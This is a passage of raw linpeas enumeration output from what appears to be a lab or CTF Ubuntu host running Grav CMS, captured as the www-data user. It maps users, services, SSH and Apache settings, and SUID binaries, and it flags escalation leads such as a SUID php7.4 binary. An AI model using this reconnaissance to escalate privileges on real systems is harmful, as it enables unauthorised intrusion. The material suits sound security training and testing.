:1.8                            935 systemd-logind  root             :1.8          systemd-logind.service      -       -
:1.9                            926 networkd-dispat root             :1.9          networkd-dispatcher.service -       -
com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
io.netplan.Netplan                - -               -                (activatable) -                           -       -
org.freedesktop.Accounts        909 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.ModemManager1   998 ModemManager    root             :1.7          ModemManager.service        -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1      929 polkitd         root             :1.6          polkit.service              -       -
org.freedesktop.UDisks2         937 udisksd         root             :1.4          udisks2.service             -       -
org.freedesktop.UPower         1433 upowerd         root             :1.15         upower.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd          1307 fwupd           root             :1.14         fwupd.service               -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          935 systemd-logind  root             :1.8          systemd-logind.service      -       -
org.freedesktop.network1        811 systemd-network systemd-network  :1.2          systemd-networkd.service    -       -
org.freedesktop.resolve1        813 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.1          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       729 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                         
                              ╚═════════════════════╝                                                                                                       
╔══════════╣ Hostname, hosts and DNS
gravity                                                                                                                                                     
127.0.0.1 localhost
127.0.0.1 gravity.com gravity

nameserver 127.0.0.53
options edns0 trust-ad
com

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                         
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.76.12  netmask 255.255.255.0  broadcast 192.168.76.255
        ether 00:50:56:bf:a6:3e  txqueuelen 1000  (Ethernet)
        RX packets 1375  bytes 1123697 (1.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1200  bytes 489786 (489.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 580  bytes 44005 (44.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 580  bytes 44005 (44.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                          
                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                         
                               ╚═══════════════════╝                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                    
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                       

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                            
                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                            
                                                                                                                                                            
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                      
ptrace protection is enabled (1)                                                                                                                            
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                  
                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                             

╔══════════╣ Users with console
alex:x:1000:1000::/home/alex:/bin/bash                                                                                                                      
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                      
uid=1000(alex) gid=1000(alex) groups=1000(alex)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=113(fwupd-refresh) gid=117(fwupd-refresh) groups=117(fwupd-refresh)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 21:34:42 up 56 min,  0 users,  load average: 0.32, 0.09, 0.03                                                                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Wed Apr  5 22:59:30 2023   still running                         0.0.0.0                                                              
root     tty1         Mon Apr  3 08:52:00 2023 - down                      (00:01)     0.0.0.0
reboot   system boot  Mon Apr  3 08:48:40 2023 - Mon Apr  3 08:53:22 2023  (00:04)     0.0.0.0

wtmp begins Wed Mar 29 07:20:46 2023

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                           
root             tty1                      Mon Apr  3 08:52:00 +0000 2023

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                          
                             ╚══════════════════════╝                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                             
/usr/bin/curl
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
                                                                                                                                                            
╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                            
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.41 (Ubuntu)                                                                                                      
Server built:   2023-03-08T17:32:54
httpd Not Found
                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                            
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Mar 29 07:16 /etc/apache2/sites-enabled                                                                                         
drwxr-xr-x 2 root root 4096 Mar 29 07:16 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Mar 29 07:16 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        <Directory /var/www/html/grav-admin/>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
        </Directory>
        ErrorLog /error.log
        CustomLog /access.log combined
</VirtualHost>


lrwxrwxrwx 1 root root 35 Mar 29 07:16 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        <Directory /var/www/html/grav-admin/>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
        </Directory>
        ErrorLog /error.log
        CustomLog /access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72941 Feb 23 12:43 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72539 Feb 23 12:43 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On

-rwxrwxr-- 1 www-data www-data 1514 Mar 17  2021 /var/www/html/grav-admin/webserver-configs/nginx.conf
server {
    index index.html index.php;
    root /home/USER/www/html;
    server_name localhost;
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }
    location ~* /(\.git|cache|bin|logs|backup|tests)/.*$ { return 403; }
    location ~* /(system|vendor)/.*\.(txt|xml|md|html|yaml|yml|php|pl|py|cgi|twig|sh|bat)$ { return 403; }
    location ~* /user/.*\.(txt|md|yaml|yml|php|pl|py|cgi|twig|sh|bat)$ { return 403; }
    location ~ /(LICENSE\.txt|composer\.lock|composer\.json|nginx\.conf|web\.config|htaccess\.txt|\.htaccess) { return 403; }
    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root/$fastcgi_script_name;
    }
}


╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Aug 16  2022 /usr/share/doc/rsync/examples/rsyncd.conf                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                        
drwxr-xr-x 2 root root 4096 Aug 31  2022 /etc/ldap


╔══════════╣ Searching ssl/ssh files
PermitRootLogin yes                                                                                                                                         
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                                                                  
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/snap/core20/1611/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core20/1611/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core20/1611/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/snap/core20/1611/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core20/1611/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/snap/core20/1611/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core20/1611/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core20/1611/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core20/1611/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
3779PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket                                                                                                 
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                              
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 29 07:03 /etc/pam.d                                                                                                         
-rw-r--r-- 1 root root 2133 Mar 30  2022 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                      
tmux 3.0a                                                                                                                                                   


/tmp/tmux-33
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3787 Mar  3 08:48 /etc/cloud/cloud.cfg                                                                                               
     lock_passwd: True
-rw-r--r-- 1 root root 3674 Jun 15  2022 /snap/core20/1611/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3786 Dec  8 16:45 /snap/core20/1852/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 200 Aug  5  2022 /snap/core20/1611/usr/share/keyrings                                                                                
drwxr-xr-x 2 root root 200 Mar  8 08:46 /snap/core20/1852/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Mar 29 07:02 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                              
passwd file: /etc/passwd
passwd file: /snap/core20/1611/etc/pam.d/passwd
passwd file: /snap/core20/1611/etc/passwd
passwd file: /snap/core20/1611/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1611/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1611/var/lib/extrausers/passwd
passwd file: /snap/core20/1852/etc/pam.d/passwd
passwd file: /snap/core20/1852/etc/passwd
passwd file: /snap/core20/1852/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1852/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1852/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwxrwxr-- 2 www-data www-data 4096 Mar 17  2021 /var/www/html/grav-admin/.github                                                                           
drwxrwxr-- 2 www-data www-data 4096 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/.github
drwxrwxr-- 2 www-data www-data 4096 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/laminas/laminas-xml/.github
drwxrwxr-- 2 www-data www-data 4096 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/laminas/laminas-zendframework-bridge/.github
drwxrwxr-- 2 www-data www-data 4096 Mar 17  2021 /var/www/html/grav-admin/user/plugins/email/vendor/swiftmailer/swiftmailer/.github
drwxrwxr-- 3 www-data www-data 4096 Mar 17  2021 /var/www/html/grav-admin/user/plugins/form/vendor/google/recaptcha/.github




╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                
gpg Not Found
netpgpkeys Not Found                                                                                                                                        
netpgp Not Found                                                                                                                                            
                                                                                                                                                            
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1611/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1611/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1611/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1611/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1611/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1852/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1852/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1852/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1852/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1852/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2250 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 2236 Mar 29 07:13 /var/lib/ubuntu-advantage/apt-esm/etc/apt/trusted.gpg.d/ubuntu-advantage-esm-apps.gpg



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1611/usr/share/bash-completion/completions/postfix                                                     

-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1852/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                            

-rw-r--r-- 1 root root 69 Feb 23 12:43 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Feb 23 12:43 /usr/share/php7.4-common/common/ftp.ini






╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind                                                                         
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                            













































-rwxrwxr-- 1 www-data www-data 2161 Mar 17  2021 /var/www/html/grav-admin/webserver-configs/web.config



╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                                                                  
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1611/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1852/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1611/etc/skel/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1852/etc/skel/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                         
                               ╚═══════════════════╝                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                            
strings Not Found                                                                                                                                           
-rwsr-xr-x 1 root root 84K Nov 29 11:53 /snap/core20/1852/usr/bin/chfn  --->  SuSE_9.3/10                                                                   
-rwsr-xr-x 1 root root 52K Nov 29 11:53 /snap/core20/1852/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29 11:53 /snap/core20/1852/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1852/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29 11:53 /snap/core20/1852/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29 11:53 /snap/core20/1852/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                 
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1852/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 16 13:06 /snap/core20/1852/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1852/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25 13:09 /snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1852/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1611/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1611/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1611/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1611/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1611/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1611/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                 
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1611/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1611/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1611/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Apr 29  2022 /snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1611/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 121K Feb 22 15:11 /snap/snapd/18596/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                                                                                     
-rwsr-xr-- 1 root messagebus 51K Oct 25 13:09 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 144K Dec  1 08:52 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 52K Nov 29 11:53 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 84K Nov 29 11:53 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 163K Jan 16 13:06 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Nov 29 11:53 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K Nov 29 11:53 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 4.6M Feb 23 12:43 /usr/bin/php7.4 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 87K Nov 29 11:53 /usr/bin/gpasswd

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                            
-rwxr-sr-x 1 root shadow 83K Nov 29 11:53 /snap/core20/1852/usr/bin/chage                                                                                   
-rwxr-sr-x 1 root shadow 31K Nov 29 11:53 /snap/core20/1852/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1852/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1852/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /snap/core20/1852/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /snap/core20/1852/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 83K Mar 14  2022 /snap/core20/1611/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Mar 14  2022 /snap/core20/1611/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1611/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1611/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1611/usr/sbin/pam_extrausers_chkpwd
